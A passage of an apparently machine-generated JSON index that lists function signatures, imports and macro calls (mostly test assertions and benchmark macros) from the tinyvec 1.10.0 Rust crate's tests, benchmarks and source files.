          "assert_eq!(tv2, tiny_vec![3]);",
          "assert_eq!(tv2, tiny_vec![]);",
          "assert_eq!(tv2, tiny_vec![3]);",
          "assert_eq!(tv2, tiny_vec![]);",
          "assert_eq!(tv2, tiny_vec![]);",
          "assert_eq!(tv2, tiny_vec![1]);",
          "assert_eq!(tv2, tiny_vec![3]);",
          "assert_eq!(tv2, tiny_vec![]);",
          "assert_eq!(tv2, tiny_vec![1, 3]);",
          "assert_eq!(tv2, tiny_vec![1]);",
          "assert_eq!(tv2, tiny_vec![3]);",
          "assert_eq!(tv2, tiny_vec![]);",
          "assert_eq!(tv2, tiny_vec![1, 3]);",
          "assert_eq!(tv2, tiny_vec![1]);",
          "assert_eq!(tv2, tiny_vec![4, 5, 6]);",
          "assert_eq!(tv2, tiny_vec![4, 5, 6, 3]);",
          "assert_eq!(tv2, tiny_vec![4, 5, 6]);",
          "assert_eq!(tv2, tiny_vec![4, 5, 6, 3]);",
          "assert_eq!(tv2, tiny_vec![4, 5, 6]);",
          "assert_eq!(tv2, tiny_vec![4, 5, 6]);",
          "assert_eq!(tv2, tiny_vec![1, 4, 5, 6]);",
          "assert_eq!(tv2, tiny_vec![4, 5, 6, 3]);",
          "assert_eq!(tv2, tiny_vec![4, 5, 6]);",
          "assert_eq!(tv2, tiny_vec![1, 4, 5, 6, 3]);",
          "assert_eq!(tv2, tiny_vec![1, 4, 5, 6]);",
          "assert_eq!(tv2, tiny_vec![4, 5, 6, 3]);",
          "assert_eq!(tv2, tiny_vec![4, 5, 6]);",
          "assert_eq!(tv2, tiny_vec![1, 4, 5, 6, 3]);",
          "assert_eq!(tv2, tiny_vec![1, 4, 5, 6]);",
          "assert_eq!(tv2, tiny_vec![4]);",
          "assert_eq!(tv2, tiny_vec![4, 3]);",
          "assert_eq!(tv2, tiny_vec![1, 4]);",
          "assert_eq!(tv2, tiny_vec![1, 4, 3]);",
          "assert_eq!(&tv[..], &[5; 20]);",
          "assert_eq!(TinyVec::from(&bigger_slice[..]), tinyvec);",
          "assert_eq!(TinyVec::from(&smaller_slice[..]), tinyvec);",
          "assert_eq!(TinyVec::from(&same_size[..]), tinyvec);",
          "assert_eq!(&array, &tv[..]);",
          "let actual = tiny_vec!(1, 2, 3);",
          "assert_eq!(expected, actual);",
          "assert_eq!(tiny_vec![0u8; 4], tiny_vec!(0u8, 0u8, 0u8, 0u8));",
          "assert_eq!(tiny_vec![0u8; 4], tiny_vec!([u8; 4] => 0, 0, 0, 0));",
          "assert_eq!(tiny_vec![0; 4], tiny_vec!(0, 0, 0, 0));",
          "assert_eq!(tiny_vec![0; 4], tiny_vec!([u8; 4] => 0, 0, 0, 0));",
          "let actual2 = tiny_vec!([f32; 3] => 1.1, 1.1, 1.1);",
          "assert_eq!(expected2, actual2);",
          "let _: TinyVec<[String; 10]> = tiny_vec!([String; 10] => s);",
          "assert_eq!(tv.capacity(), 4);",
          "assert_eq!(tv.capacity(), 4);",
          "assert_eq!(tv.capacity(), 4);",
          "assert!(tv.capacity() >= 6);",
          "assert!(tv.capacity() >= 10);",
          "assert_eq!(tv.capacity(), 4);",
          "assert_eq!(tv.capacity(), 4);",
          "assert!(tv.try_reserve(2).is_ok());",
          "assert_eq!(tv.capacity(), 4);",
          "assert!(tv.try_reserve(4).is_ok());",
          "assert!(tv.capacity() >= 6);",
          "assert!(tv.try_reserve(4).is_ok());",
          "assert!(tv.capacity() >= 10);",
          "assert_eq!(tv.capacity(), 4);",
          "assert_eq!(tv.capacity(), 4);",
          "assert_eq!(tv.capacity(), 4);",
          "assert!(tv.capacity() >= 6);",
          "assert!(tv.capacity() >= 10);",
          "assert_eq!(tv.capacity(), 4);",
          "assert_eq!(tv.capacity(), 4);",
          "assert!(tv.try_reserve_exact(2).is_ok());",
          "assert_eq!(tv.capacity(), 4);",
          "assert!(tv.try_reserve_exact(4).is_ok());",
          "assert!(tv.capacity() >= 6);",
          "assert!(tv.try_reserve_exact(4).is_ok());",
          "assert!(tv.capacity() >= 10);",
          "assert!(tv.is_inline());",
          "assert!(tv.is_heap());",
          "assert_eq!(tv.capacity(), 0);",
          "assert!(tv.is_inline());",
          "assert_eq!(tv.capacity(), 4);",
          "assert!(tv.is_heap());",
          "assert_eq!(tv.capacity(), 4);",
          "assert_eq!(tv.capacity(), 4);",
          "assert_eq!(tv.as_slice(), [1, 2, 3, 4]);",
          "assert!(tv.is_inline());",
          "assert!(tv.try_move_to_the_heap().is_ok());",
          "assert!(tv.is_heap());",
          "assert_eq!(tv.capacity(), 0);",
          "assert!(tv.try_reserve_exact(1).is_ok());",
          "assert_eq!(tv.capacity(), 1);",
          "assert!(tv.is_inline());",
          "assert_eq!(tv.capacity(), 4);",
          "assert!(tv.try_move_to_the_heap_and_reserve(3).is_ok());",
          "assert!(tv.is_heap());",
          "assert_eq!(tv.capacity(), 4);",
          "assert_eq!(tv.capacity(), 4);",
          "assert_eq!(tv.as_slice(), [1, 2, 3, 4]);",
          "assert_eq!(tv, des);",
          "assert_eq!(tv, des);",
          "assert_eq!(tv, des);",
          "let s = format!(\"{:#?}\", tv);",
          "let expected = format!(\"{:#?}\", tv.as_slice());",
          "assert_eq!(s, expected);",
          "assert!(tv.is_inline());",
          "assert_eq!(tv, tiny_vec![b'f', b'o', b'o']);",
          "assert!(tv.is_heap());",
          "assert_eq!(tv, tiny_vec![b'f', b'o', b'o', b'b', b'a', b'r']);"
        ],
        "derives": [],
        "error_handling": 8
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tinyvec-1.10.0/tests/debugger_visualizer.rs",
        "function_defs": [
          "fn __break() {",
          "fn test_debugger_visualizer() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use debugger_test::debugger_test;",
          "use tinyvec::*;"
        ],
        "macros": [
          "println!(\"breakpoint hit\");",
          "assert_eq!([\"a\", \"b\", \"c\"], &strings[..]);",
          "let mut inline_tv = tiny_vec!([i32; 4] => 1, 2, 3);",
          "assert!(inline_tv.is_inline());",
          "assert_eq!(3, slice_vec.capacity());",
          "assert_eq!(\"c\", slice_vec.remove(2));",
          "println!(\"{:?}\", slice_vec);",
          "assert_eq!([\"a\", \"b\", \"d\"], &slice_vec[..]);",
          "assert_eq!([\"a\", \"b\", \"d\", \"e\", \"f\", \"g\"], &strings[..]);"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tinyvec-1.10.0/benches/smallvec.rs",
        "function_defs": [
          "fn tinyvec_benches(c: &mut Criterion) {",
          "fn smallvec_benches(c: &mut Criterion) {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use criterion::{black_box, criterion_group, criterion_main, Criterion};",
          "use smallvec::SmallVec;",
          "use std::iter::FromIterator;",
          "use tinyvec::TinyVec;"
        ],
        "macros": [
          "let mut g = $c.benchmark_group(concat!(",
          "stringify!($type),",
          "stringify!($len)",
          "concat!(",
          "stringify!($type),",
          "stringify!($len),",
          "concat!(",
          "stringify!($type),",
          "stringify!($len),",
          "concat!(",
          "stringify!($type),",
          "stringify!($len),",
          "concat!(",
          "stringify!($type),",
          "stringify!($len),",
          "concat!(",
          "stringify!($type),",
          "stringify!($len),",
          "concat!(",
          "stringify!($type),",
          "stringify!($len),",
          "concat!(",
          "stringify!($type),",
          "stringify!($len),",
          "concat!(",
          "stringify!($type),",
          "stringify!($len),",
          "concat!(",
          "stringify!($type),",
          "stringify!($len),",
          "concat!(",
          "stringify!($type),",
          "stringify!($len),",
          "tinyvec_benches!(c, u8; 8);",
          "tinyvec_benches!(c, u8; 16);",
          "tinyvec_benches!(c, u8; 32);",
          "tinyvec_benches!(c, u8; 64);",
          "tinyvec_benches!(c, u8; 128);",
          "tinyvec_benches!(c, u8; 256);",
          "tinyvec_benches!(c, u64; 2);",
          "tinyvec_benches!(c, u64; 4);",
          "tinyvec_benches!(c, u64; 8);",
          "tinyvec_benches!(c, u64; 16);",
          "tinyvec_benches!(c, u64; 32);",
          "let mut g = $c.benchmark_group(concat!(",
          "stringify!($type),",
          "stringify!($len)",
          "concat!(",
          "stringify!($type),",
          "stringify!($len),",
          "concat!(",
          "stringify!($type),",
          "stringify!($len),",
          "concat!(",
          "stringify!($type),",
          "stringify!($len),",
          "concat!(",
          "stringify!($type),",
          "stringify!($len),",
          "concat!(",
          "stringify!($type),",
          "stringify!($len),",
          "concat!(",
          "stringify!($type),",
          "stringify!($len),",
          "concat!(",
          "stringify!($type),",
          "stringify!($len),",
          "concat!(",
          "stringify!($type),",
          "stringify!($len),",
          "concat!(",
          "stringify!($type),",
          "stringify!($len),",
          "concat!(",
          "stringify!($type),",
          "stringify!($len),",
          "smallvec_benches!(c, u8; 8);",
          "smallvec_benches!(c, u8; 16);",
          "smallvec_benches!(c, u8; 32);",
          "smallvec_benches!(c, u8; 64);",
          "smallvec_benches!(c, u8; 128);",
          "smallvec_benches!(c, u8; 256);",
          "smallvec_benches!(c, u64; 2);",
          "smallvec_benches!(c, u64; 4);",
          "smallvec_benches!(c, u64; 8);",
          "smallvec_benches!(c, u64; 16);",
          "smallvec_benches!(c, u64; 32);",
          "criterion_group!(benches, tinyvec_benches, smallvec_benches);",
          "criterion_main!(benches);"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tinyvec-1.10.0/benches/macros.rs",
        "function_defs": [
          "fn bench_tinyvec_macro(c: &mut Criterion) {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use criterion::{criterion_group, criterion_main, Criterion};",
          "use tinyvec::tiny_vec;"
        ],
        "macros": [
          "b.iter(|| tiny_vec!([u8; 32]));",
          "tiny_vec!([u8; 32]=>",
          "tiny_vec!([u8; 32]=>",
          "tiny_vec!([u8; 32]=>",
          "tiny_vec!([u8; 32]=>",
          "criterion_group!(benches, bench_tinyvec_macro);",
          "criterion_main!(benches);"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tinyvec-1.10.0/src/arrayvec.rs",
        "function_defs": [
          "fn clone(&self) -> Self {",
          "fn clone_from(&mut self, o: &Self) {",
          "fn default() -> Self {",
          "fn deref(&self) -> &Self::Target {",
          "fn deref_mut(&mut self) -> &mut Self::Target {",
          "fn index(&self, index: I) -> &Self::Output {",
          "fn index_mut(&mut self, index: I) -> &mut Self::Output {",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>",
          "fn serialize<W: borsh::io::Write>(",
          "fn deserialize_reader<R: borsh::io::Read>(",
          "fn arbitrary(u: &mut arbitrary::Unstructured<'a>) -> arbitrary::Result<Self> {",
          "fn size_hint(depth: usize) -> (usize, Option<usize>) {",
          "fn drop(&mut self) {",
          "fn drop(&mut self) {",
          "fn next(&mut self) -> Option<A::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn len(&self) -> usize {",
          "fn next_back(&mut self) -> Option<A::Item> {",
          "fn drop(&mut self) {",
          "fn as_mut(&mut self) -> &mut [A::Item] {",
          "fn as_ref(&self) -> &[A::Item] {",
          "fn borrow(&self) -> &[A::Item] {",
          "fn borrow_mut(&mut self) -> &mut [A::Item] {",
          "fn extend<T: IntoIterator<Item = A::Item>>(&mut self, iter: T) {",
          "fn from(data: A) -> Self {",
          "fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {",
          "fn try_from(slice: &[T]) -> Result<Self, Self::Error> {",
          "fn from_iter<T: IntoIterator<Item = A::Item>>(iter: T) -> Self {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn count(self) -> usize {",
          "fn last(mut self) -> Option<Self::Item> {",
          "fn nth(&mut self, n: usize) -> Option<A::Item> {",
          "fn next_back(&mut self) -> Option<Self::Item> {",
          "fn nth_back(&mut self, n: usize) -> Option<Self::Item> {",
          "fn len(&self) -> usize {",
          "fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn eq(&self, other: &Self) -> bool {",
          "fn partial_cmp(&self, other: &Self) -> Option<core::cmp::Ordering> {",
          "fn cmp(&self, other: &Self) -> core::cmp::Ordering {",
          "fn eq(&self, other: &&A) -> bool {",
          "fn eq(&self, other: &&[A::Item]) -> bool {",
          "fn hash<H: Hasher>(&self, state: &mut H) {",
          "fn write_str(&mut self, s: &str) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn expecting(",
          "fn visit_seq<S>(self, mut seq: S) -> Result<Self::Value, S::Error>",
          "fn retain_mut_empty_vec() {",
          "fn retain_mut_all_elements() {",
          "fn retain_mut_some_elements() {",
          "fn retain_mut_no_elements() {",
          "fn retain_mut_zero_capacity() {"
        ],
        "struct_defs": [
          "struct JoinOnDrop<'vec, Item> {",
          "struct JoinOnDrop<'vec, Item> {",
          "struct ArrayVecVisitor<A: Array>(PhantomData<A>);"
        ],
        "impl_blocks": [
          "impl core::fmt::Display for TryFromSliceError {",
          "impl std::error::Error for TryFromSliceError {}"
        ],
        "uses": [
          "use super::*;",
          "use core::convert::{TryFrom, TryInto};",
          "use core::marker::PhantomData;",
          "use serde::de::{",
          "use serde::ser::{Serialize, SerializeSeq, Serializer};",
          "use core::ops::Bound;",
          "use alloc::vec::Vec;",
          "use alloc::collections::TryReserveError;",
          "use super::*;"
        ],
        "macros": [
          "/// let empty_av = array_vec!([u8; 16]);",
          "/// let some_ints = array_vec!([i32; 4] => 1, 2, 3);",
          "/// let empty_av: ArrayVec<[u8; 10]> = array_vec!();",
          "/// let some_ints: ArrayVec<[u8; 10]> = array_vec!(5, 6, 7, 8);",
          "$crate::array_vec!(_ => $($elem),*)",
          "$crate::array_vec!(_)",
          "/// let some_ints = array_vec!([i32; 4] => 1, 2, 3);",
          "/// assert_eq!(some_ints.len(), 3);",
          "/// assert_eq!(some_ints.len(), 0);",
          "/// assert_eq!(some_ints, more_ints);",
          "/// assert_eq!(some_ints.len(), 4);",
          "/// assert_eq!(more_ints.len(), 2);",
          "/// assert_eq!(no_ints.len(), 0);",
          "/// let mut av = array_vec!([i32; 10] => 1, 2, 3);",
          "/// let mut av2 = array_vec!([i32; 10] => 4, 5, 6);",
          "/// assert_eq!(av, &[1, 2, 3, 4, 5, 6][..]);",
          "/// assert_eq!(av2, &[][..]);",
          "assert!(",
          "/// let mut av = array_vec!([i32; 7] => 1, 2, 3);",
          "/// let mut av2 = array_vec!([i32; 7] => 4, 5, 6);",
          "/// assert_eq!(av, &[1, 2, 3, 4, 5, 6][..]);",
          "/// assert_eq!(av2, &[][..]);",
          "/// let mut av3 = array_vec!([i32; 7] => 7, 8, 9);",
          "/// assert!(av.try_append(&mut av3).is_some());",
          "/// assert_eq!(av, &[1, 2, 3, 4, 5, 6][..]);",
          "/// assert_eq!(av3, &[7, 8, 9][..]);",
          "/// let mut av = array_vec!([i32; 4] => 1, 2, 3);",
          "/// assert_eq!(av.as_slice(), &[1][..]);",
          "/// assert_eq!(av2.as_slice(), &[2, 3][..]);",
          "/// assert_eq!(av.as_slice(), &[]);",
          "/// let mut favorite_numbers = array_vec!([i32; 5] => 87, 48, 33, 9, 26);",
          "/// assert_eq!(favorite_numbers.clone().into_inner(), [87, 48, 33, 9, 26]);",
          "/// assert_eq!(favorite_numbers.into_inner(), [87, 48, 33, 9, 0]);",
          "/// assert_eq!(inner, [1, 2, 3, 1, 2, 3, 1, 2, 3, 1]);",
          "assert!(",
          "/// let mut av = array_vec!([i32; 4]);",
          "/// assert_eq!(&av[..], [0, 1, 2, 3]);",
          "/// assert_eq!(to_inf.next(), Some(4));",
          "Err(_) => panic!(",
          "/// let mut av = array_vec!([i32; 10] => 1, 2, 3);",
          "/// assert_eq!(av.as_slice(), &[1, 4, 2, 3]);",
          "/// assert_eq!(av.as_slice(), &[1, 4, 2, 3, 5]);",
          "assert!(x.is_none(), \"ArrayVec::insert> capacity overflow!\");",
          "/// let mut av = array_vec!([&'static str; 4] => \"one\", \"two\", \"three\");",
          "/// assert_eq!(av.as_slice(), &[\"one\", \"four\", \"two\", \"three\"]);",
          "/// assert_eq!(av.try_insert(4, \"five\"), Some(\"five\"));",
          "assert!(",
          "/// let mut av = array_vec!([i32; 10] => 1, 2);",
          "/// assert_eq!(av.pop(), Some(2));",
          "/// assert_eq!(av.pop(), Some(1));",
          "/// assert_eq!(av.pop(), None);",
          "/// let mut av = array_vec!([i32; 2]);",
          "/// assert_eq!(&av[..], []);",
          "/// assert_eq!(&av[..], [1]);",
          "/// assert_eq!(&av[..], [1, 2]);",
          "assert!(x.is_none(), \"ArrayVec::push> capacity overflow!\");",
          "/// let mut av = array_vec!([i32; 2]);",
          "/// assert_eq!(av.as_slice(), []);",
          "/// assert_eq!(av.try_push(1), None);",
          "/// assert_eq!(&av[..], [1]);",
          "/// assert_eq!(av.try_push(2), None);",
          "/// assert_eq!(&av[..], [1, 2]);",
          "/// assert_eq!(av.try_push(3), Some(3));",
          "debug_assert!(self.len as usize <= A::CAPACITY);",
          "/// let mut av = array_vec!([i32; 4] => 1, 2, 3);",
          "/// assert_eq!(av.remove(1), 2);",
          "/// assert_eq!(&av[..], [1, 3]);",
          "/// let mut av = array_vec!([&str; 10] => \"hello\");",
          "/// assert_eq!(&av[..], [\"hello\", \"world\", \"world\"]);",
          "/// let mut av = array_vec!([i32; 10] => 1, 2, 3, 4);",
          "/// assert_eq!(&av[..], [1, 2]);",
          "/// let mut av = array_vec!([i32; 10] => 1, 2, 3);",
          "/// assert_eq!(&av[..], [1, 2, 3, 0, 0]);",
          "/// let mut av = array_vec!([i32; 10]);",
          "/// assert_eq!(&av[..], [2, 4, 8, 16]);",
          "/// let mut av = array_vec!([i32; 10] => 1, 1, 2, 3, 3, 4);",
          "/// assert_eq!(&av[..], [2, 4]);",
          "/// let mut av = array_vec!([i32; 10] => 1, 1, 2, 3, 3, 4);",
          "/// assert_eq!(&av[..], [4, 8]);",
          "panic!(",
          "/// let mut av = array_vec!([i32; 4] => 1, 2, 3);",
          "/// assert_eq!(&av[..], [1]);",
          "/// assert_eq!(&av2[..], [2, 3]);",
          "panic!(",
          "/// let mut av = array_vec!([i32; 4] => 1, 2, 3);",
          "/// assert_eq!(av.as_slice(), &[1, 4, 5, 6][..]);",
          "/// assert_eq!(av2.as_slice(), &[2, 3][..]);",
          "/// assert_eq!(av.as_slice(), &[]);",
          "assert!(",
          "assert!(",
          "/// let mut av = array_vec!([&str; 4] => \"foo\", \"bar\", \"quack\", \"zap\");",
          "/// assert_eq!(av.swap_remove(1), \"bar\");",
          "/// assert_eq!(&av[..], [\"foo\", \"zap\", \"quack\"]);",
          "/// assert_eq!(av.swap_remove(0), \"foo\");",
          "/// assert_eq!(&av[..], [\"quack\", \"zap\"]);",
          "assert!(",
          "/// assert_eq!(DATA.len(), 0);",
          "/// assert_eq!(&data[..], &[]);",
          "/// assert_eq!(&data[..], &[42]);",
          "/// let mut av = array_vec!([i32; 4]);",
          "/// assert_eq!(av.grab_spare_slice().len(), 4);",
          "/// assert_eq!(av.grab_spare_slice().len(), 0);",
          "/// let mut av = array_vec!([i32; 4]);",
          "/// assert_eq!(av.grab_spare_slice_mut().len(), 4);",
          "/// assert_eq!(av.grab_spare_slice_mut().len(), 2);",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "/// let mut av = array_vec!([i32; 7] => 1, 2, 3);",
          "/// assert_eq!(v, &[1, 2, 3]);",
          "/// assert_eq!(v.capacity(), 13);",
          "/// let mut av = array_vec!([i32; 7] => 1, 2, 3);",
          "/// assert!(matches!(v, Ok(_)));",
          "/// assert_eq!(v, &[1, 2, 3]);",
          "/// assert_eq!(v.capacity(), 13);",
          "/// let mut av = array_vec!([i32; 7] => 1, 2, 3);",
          "/// assert_eq!(v, &[1, 2, 3]);",
          "/// assert_eq!(v.capacity(), 3);",
          "/// let mut av = array_vec!([i32; 7] => 1, 2, 3);",
          "/// assert!(matches!(v, Ok(_)));",
          "/// assert_eq!(v, &[1, 2, 3]);",
          "/// assert!(v.capacity() >= 3);",
          "assert_eq!(av.len(), 0);",
          "let mut av: ArrayVec<[i32; 4]> = array_vec!([i32; 4] => 2, 4, 6, 8);",
          "assert_eq!(av.len(), 4);",
          "assert_eq!(av.as_slice(), &[2, 4, 6, 8]);",
          "let mut av: ArrayVec<[i32; 4]> = array_vec!([i32; 4] => 1, 2, 3, 4);",
          "assert_eq!(av.len(), 2);",
          "assert_eq!(av.as_slice(), &[2, 4]);",
          "let mut av: ArrayVec<[i32; 4]> = array_vec!([i32; 4] => 1, 3, 5, 7);",
          "assert_eq!(av.len(), 0);",
          "assert_eq!(av.len(), 0);"
        ],
        "derives": [
          "#[derive(Debug, Copy, Clone)]"
        ],
        "error_handling": 72
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tinyvec-1.10.0/src/arrayvec_drain.rs",
        "function_defs": [
          "fn next_back(&mut self) -> Option<Self::Item> {",
          "fn nth_back(&mut self, n: usize) -> Option<Self::Item> {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn nth(&mut self, n: usize) -> Option<Self::Item> {",
          "fn last(self) -> Option<Self::Item> {",
          "fn for_each<F>(self, f: F)"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::*;",
          "use core::{"
        ],
        "macros": [
          "assert!(",
          "assert!("
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tinyvec-1.10.0/src/lib.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use core::{"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tinyvec-1.10.0/src/tinyvec.rs",
        "function_defs": [
          "fn clone(&self) -> Self {",
          "fn clone_from(&mut self, o: &Self) {",
          "fn default() -> Self {",
          "fn deref(self: &Self) -> &Self::Target;",
          "fn deref_mut(self: &mut Self) -> &mut Self::Target;",
          "fn index(&self, index: I) -> &Self::Output {",
          "fn index_mut(&mut self, index: I) -> &mut Self::Output {",
          "fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {",
          "fn flush(&mut self) -> std::io::Result<()> {",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>",
          "fn serialize<W: borsh::io::Write>(",
          "fn deserialize_reader<R: borsh::io::Read>(",
          "fn arbitrary(u: &mut arbitrary::Unstructured<'a>) -> arbitrary::Result<Self> {",
          "fn drain_to_heap_and_push<A: Array>(",
          "fn next(self: &mut Self) -> Option<Self::Item>;",
          "fn nth(self: &mut Self, n: usize) -> Option<Self::Item>;",
          "fn size_hint(self: &Self) -> (usize, Option<usize>);",
          "fn last(self: Self) -> Option<Self::Item>;",
          "fn count(self: Self) -> usize;",
          "fn for_each<F: FnMut(Self::Item)>(self, f: F) {",
          "fn next_back(self: &mut Self) -> Option<Self::Item>;",
          "fn nth_back(self: &mut Self, n: usize) -> Option<Self::Item>;",
          "fn next(&mut self) -> Option<A::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn len(&self) -> usize {",
          "fn next_back(&mut self) -> Option<A::Item> {",
          "fn drop(&mut self) {",
          "fn as_mut(&mut self) -> &mut [A::Item] {",
          "fn as_ref(&self) -> &[A::Item] {",
          "fn borrow(&self) -> &[A::Item] {",
          "fn borrow_mut(&mut self) -> &mut [A::Item] {",
          "fn extend<T: IntoIterator<Item = A::Item>>(&mut self, iter: T) {",
          "fn from(arr: ArrayVec<A>) -> Self {",
          "fn from(array: A) -> Self {",
          "fn from(slice: &[T]) -> Self {",
          "fn from(slice: &mut [T]) -> Self {",
          "fn from_iter<T: IntoIterator<Item = A::Item>>(iter: T) -> Self {",
          "fn into(self) -> Vec<A::Item> {",
          "fn next(self: &mut Self) -> Option<Self::Item>;",
          "fn size_hint(self: &Self) -> (usize, Option<usize>);",
          "fn count(self: Self) -> usize;",
          "fn last(self: Self) -> Option<Self::Item>;",
          "fn nth(self: &mut Self, n: usize) -> Option<A::Item>;",
          "fn next_back(self: &mut Self) -> Option<Self::Item>;",
          "fn nth_back(self: &mut Self, n: usize) -> Option<Self::Item>;",
          "fn len(self: &Self) -> usize;",
          "fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn eq(&self, other: &Self) -> bool {",
          "fn partial_cmp(&self, other: &Self) -> Option<core::cmp::Ordering> {",
          "fn cmp(&self, other: &Self) -> core::cmp::Ordering {",
          "fn eq(&self, other: &&A) -> bool {",
          "fn eq(&self, other: &&[A::Item]) -> bool {",
          "fn hash<H: Hasher>(&self, state: &mut H) {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn expecting(",
          "fn visit_seq<S>(self, mut seq: S) -> Result<Self::Value, S::Error>"
        ],
        "struct_defs": [
          "struct TinyVecVisitor<A: Array>(PhantomData<A>);"
        ],
        "impl_blocks": [],
        "uses": [
          "use super::*;",
          "use alloc::vec::{self, Vec};",
          "use core::convert::TryFrom;",
          "use tinyvec_macros::impl_mirrored;",
          "use alloc::collections::TryReserveError;",
          "use core::marker::PhantomData;",
          "use serde::de::{Deserialize, Deserializer, SeqAccess, Visitor};",
          "use serde::ser::{Serialize, SerializeSeq, Serializer};",
          "use core::ops::Bound;"
        ],
        "macros": [
          "/// let empty_tv = tiny_vec!([u8; 16]);",
          "/// let some_ints = tiny_vec!([i32; 4] => 1, 2, 3);",
          "/// let many_ints = tiny_vec!([i32; 4] => 1, 2, 3, 4, 5, 6, 7, 8, 9, 10);",
          "/// let empty_tv: TinyVec<[u8; 16]> = tiny_vec!();",
          "/// let some_ints: TinyVec<[i32; 4]> = tiny_vec!(1, 2, 3);",
          "/// let many_ints: TinyVec<[i32; 4]> = tiny_vec!(1, 2, 3, 4, 5, 6, 7, 8, 9, 10);",
